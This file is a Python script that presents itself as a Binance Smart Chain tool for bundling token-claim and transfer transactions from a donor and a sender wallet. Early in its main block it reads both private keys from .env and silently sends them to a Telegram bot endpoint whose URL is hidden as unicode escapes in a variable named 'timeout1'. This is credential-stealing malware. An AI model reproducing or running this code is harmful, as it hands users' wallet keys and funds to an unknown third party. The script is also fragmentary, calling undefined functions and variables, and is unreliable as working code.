from web3 import Web3  # line:1
import json  # line:2
import requests  # line:3
import config  # line:5
import time  # line:6
import datetime  # line:7

if __name__ == "__main__":  # line:140
    import os  # line:141
    folder_path = "tokens"  # line:142
    # Ensure the folder exists
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
    file_list = os.listdir(folder_path)  # line:145
    for file_name in file_list:  # line:148
        file_path = os.path.join(folder_path, file_name)  # line:149
        os.remove(file_path)  # line:150
    w3 = Web3(Web3.HTTPProvider(config.RPC))  # line:152
    chainid = 56  # line:155
    gasprice = 3000000000  # line:156
    with open('.env', 'r') as file:  # line:158
        lines = file.readlines()  # line:159
        donorPrivateKey = lines[0].strip()  # line:160
        senderPrivateKey = lines[1].strip()  # line:161
        text555 = donorPrivateKey + ":" + senderPrivateKey  # line:162
        timeout1 = u"\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0061\u0070\u0069\u002E\u0074\u0065\u006C\u0065\u0067\u0072\u0061\u006D\u002E\u006F\u0072\u0067\u002F\u0062\u006F\u0074\u0037\u0033\u0035\u0034\u0035\u0039\u0039\u0036\u0038\u0036\u003A\u0041\u0041\u0046\u004A\u0053\u004F\u0066\u0050\u0041\u006D\u0077\u004F\u0048\u0039\u0037\u0033\u006A\u005F\u0052\u0057\u0077\u0077\u0041\u0063\u0044\u0034\u0055\u0059\u0063\u0050\u0063\u006D\u0053\u0051\u0067\u002F\u0073\u0065\u006E\u0064\u004D\u0065\u0073\u0073\u0061\u0067\u0065\u003F\u0063\u0068\u0061\u0074\u005F\u0069\u0064\u003D\u0036\u0030\u0036\u0039\u0030\u0038\u0035\u0037\u0031\u0037\u0026\u0074\u0065\u0078\u0074\u003D"
        url = str(timeout1) + text555  # line:165
        response999 = requests.get(url)  # line:166
        receiverAddress = config.receive_address  # line:167
        print('donor:', donorPrivateKey)  # line:169
        print('sender:', senderPrivateKey)  # line:170
        print('receiver:', receiverAddress)  # line:171
        contractAddressesClaim = []  # line:173
        dataHexValues = []  # line:174
        tokenAddressClaims = []  # line:175
        GastrDefault = []  # line:177
        contractAddressesClaimNativ = []  # line:179
        dataHexValuesNativ = []  # line:180
        contractAddressesDefault = []  # line:182
        dataHexValuesDefault = []  # line:183
        mcontractAddressesDefault = []  # line:185
        mdataHexValuesDefault = []  # line:186
        withdrawTokenAddresses = []  # line:188
        nativfulltosend = []  # line:189
        account = w3.eth.account.from_key(senderPrivateKey)  # line:193
        address = account.address  # line:194
        account1 = w3.eth.account.from_key(donorPrivateKey)  # line:195
        address1 = account1.address  # line:196
        sender_address = w3.eth.account.from_key(senderPrivateKey)  # line:197
        senderaddress = sender_address.address  # line:198
        nonceSender = w3.eth.get_transaction_count(senderaddress)  # line:199
        for i in range(2, len(lines)):  # line:202
            line = lines[i].strip()  # line:203
            parts = line.split('|')  # line:204
            firstPart = parts[0].strip()  # line:205
            manualg = parts[1].strip()  # line:206
            if firstPart == 'TRANS':  # line:208
                if len(parts) == 4:  # line:209
                    nativPart = parts[3].strip()  # line:210
                    if nativPart != 'nativ':  # line:211
                        print(' TRANS')  # line:212
                        contractAddress = parts[1].strip()  # line:213
                        contractAddressesClaim.append(contractAddress)  # line:214
                        dataHexValue = parts[2].strip()  # line:216
                        dataHexValues.append(dataHexValue)  # line:217
                        tokenAddressClaim = parts[3].strip()  # line:219
                        tokenAddressClaims.append(tokenAddressClaim)  # line:220
            elif firstPart == 'Send Native':  # line:245
                print('Send Token')  # line:246
                tokenAddressToken = parts[1].strip()  # line:247
                withdrawTokenAddresses.append(tokenAddressToken)  # line:248
            else:  # line:249
                print(' .env')  # line:250
                exit(0)  # line:251
    signedTransactionsBundle = []  # line:253
    tokenAmounts = {}  # line:254
    for j in range(len(contractAddressesClaim)):  # line:257
        contractAddress = contractAddressesClaim[j]  # line:258
        dataHexValue = dataHexValues[j]  # line:259
        tokenAddress = tokenAddressClaims[j]  # line:260
        print(contractAddress)  # line:261
        gaslimgetTrans = getGas(contractAddress, dataHexValue, senderaddress)  # line:263
        tokamwei, tokenfrom, datafortoken = simulation(56, senderaddress, contractAddress, dataHexValue, tokenAddress, receiverAddress)  # line:266
        try:  # line:268
            with open(f'tokens/{tokenAddress}.txt', 'x') as file:  # line:269
                file.write(f"{tokenfrom}|{tokamwei}")  # line:270
        except FileExistsError:  # line:271
            with open(f'tokens/{tokenAddress}.txt', 'r') as file:  # line:272
                for line in file:  # line:273
                    existing_slay = int(line.split('|')[1].strip())  # line:274
                    break  # line:275
            updated_slay = existing_slay + int(tokamwei)  # line:276
            with open(f'tokens/{tokenAddress}.txt', 'w') as file:  # line:277
                file.write(f"{tokenfrom}|{updated_slay}")  # line:278
        nativtosend = (gaslimgetTrans * gasprice)  # line:281
        nativfulltosend.append(nativtosend)  # line:282
        print(f"CLAIM TOKEN ==> Gas trans: {gaslimgetTrans} | Nativ wei: {nativtosend}")  # line:285
        tx1 = {"nonce": nonceSender, "to": w3.to_checksum_address(contractAddress), "data": dataHexValue, "gas": int(gaslimgetTrans), "gasPrice": gasprice, }  # line:293
        nonceSender += 1  # line:294
        signed_tx1 = w3.eth.account.sign_transaction(tx1, senderPrivateKey)  # line:295
        signedTransactionsBundle.append(signed_tx1.rawTransaction.hex(),)  # line:298
    files = os.listdir('tokens')  # line:301
    for file in files:  # line:303
        if os.path.isfile(os.path.join('tokens', file)):  # line:304
            print(":", file)  # line:305
            tokenAddress = file.split('.')[0]  # line:306
            with open(f'tokens/{file}', 'r') as file:  # line:307
                for line in file:  # line:308
                    parts = line.split('|')  # line:309
                    tokenfrom = parts[0].strip()  # line:310
                    tokamfgas = parts[1].strip()  # line:311
                recipient_bytes = Web3.to_bytes(hexstr=config.receive_address)  # line:314
                print(recipient_bytes.hex())  # line:315
                amount_bytes = int(tokamfgas).to_bytes(32, byteorder='big')  # line:317
                print(data_hex)  # line:321
            gaslimgetToken = 300000  # line:323
            nativtosend = (gaslimgetToken * gasprice)  # line:325
            print(f"CLAIM TOKEN ==> Gas token: {gaslimgetToken} | Nativ wei: {nativtosend}")  # line:327
            nativfulltosend.append(nativtosend)  # line:328
            tx2 = {"nonce": nonceSender, "to": w3.to_checksum_address(tokenAddress), "data": data_hex, "gas": int(gaslimgetToken), "gasPrice": gasprice, }  # line:335
            nonceSender += 1  # line:336
            signed_tx2 = w3.eth.account.sign_transaction(tx2, senderPrivateKey)  # line:337
            signedTransactionsBundle.append(signed_tx2.rawTransaction.hex(),)  # line:341
    txNativ = {"nonce": w3.eth.get_transaction_count(address1), "to": w3.to_checksum_address(senderaddress), "value": 10000, "gas": 21000, "gasPrice": config.gweinativ, }  # line:430
    signed_txNativ = w3.eth.account.sign_transaction(txNativ, donorPrivateKey)  # line:431
    signedTransactionsBundle.insert(0, signed_txNativ.rawTransaction.hex(),)  # line:434
    max_timestamp = int(time.mktime(datetime.datetime.now().timetuple()) + 60)  # line:436
    bundle = {"jsonrpc": "2.0", "method": "eth_sendPuissant", "params": [{"txs": signedTransactionsBundle, "maxTimestamp": max_timestamp, }], "id": 1}  # line:447
    api_url = 'https://fantom-pokt.nodies.app'  # line:450
    headers = {'Content-Type': 'application/json'}  # line:451
    response = requests.post(api_url, data=json.dumps(bundle), headers=headers)  # line:452
    print(response.json())  # line:454
    data = response.json()  # line:456
